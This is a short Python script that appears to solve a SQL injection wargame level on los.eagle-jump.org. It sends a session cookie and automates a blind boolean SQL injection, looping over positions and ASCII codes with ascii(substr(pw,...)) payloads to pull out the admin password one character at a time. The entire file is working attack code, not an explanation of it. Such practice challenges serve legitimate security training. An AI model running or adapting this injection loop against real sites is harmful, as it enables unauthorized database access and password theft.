#!/usr/bin/python
import requests
import re


cookie = {'PHPSESSID': '5h0ft21d4dfvevuuku7qtttgl7'}

url = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=-1'"

cmp = "Hello admin"

dbname=""

#Password is
for i in range(1, 10):
    for j in range(40, 125):
        query = url + " || (id='-1' || ascii(substr(pw," + str(i) + ",1))=" + str(j) + ")-- -"
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += chr(j)
            break
print "Password is : " + dbname
    
    





